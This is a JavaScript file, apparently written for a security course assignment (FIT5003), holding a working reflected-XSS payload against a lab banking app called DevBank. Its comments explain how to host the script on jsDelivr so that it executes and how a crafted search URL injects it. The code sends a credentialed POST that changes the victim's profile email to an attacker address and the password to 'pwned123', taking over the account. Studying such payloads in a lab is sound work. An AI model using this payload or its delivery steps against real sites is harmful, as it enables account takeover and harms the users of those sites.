// FIT5003 A2 - Part B.2 reflected-XSS payload (account takeover).
//
// Host this on YOUR OWN GitHub repo and load it through jsDelivr so it is served
// with a JavaScript content-type (a raw github.com URL is text/plain + nosniff
// and will NOT execute):
//
//   https://cdn.jsdelivr.net/gh/<your-user>/<your-repo>@main/payload.js
//
// Delivery: a logged-in DevBank victim opens your crafted search URL (see
// README / walkthrough). The reflected sink injects
//   <script src="https://cdn.jsdelivr.net/gh/.../payload.js"></script>
// so THIS code runs in the victim's authenticated session and changes their
// profile email + password -> attacker now controls the account.
//
// credentials:"include" sends the victim's DevBank cookie; the request is
// same-origin (it targets /profile on the page's own origin), so it succeeds
// on the vulnerable app.

(function () {
  var body = "email=attacker@evil.example&password=pwned123";
  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body,
    credentials: "include"
  }).then(function () {
    // Visible proof the payload fired (optional).
    console.log("[payload] profile updated - account taken over");
  });
})();
